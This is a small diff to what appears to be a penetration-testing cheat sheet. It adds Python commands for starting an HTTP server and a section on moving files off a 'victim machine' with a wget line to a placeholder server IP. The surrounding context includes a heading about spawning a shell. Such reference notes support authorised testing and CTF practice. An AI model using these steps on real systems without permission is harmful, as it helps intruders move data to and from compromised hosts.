@@ -40,7 +40,12 @@ $ dig mysite.com
 ## Starting a Python httpserver
 
 ```
+$ python -m SimpleHTTPServer <port>
 $ python3 -m http.server <port>
+```
+To extract files from the victim machine
+```
+$ wget http://<ip of the server>/<filename of the file you need transferred>
 ```
 
 ## Spawning a shell
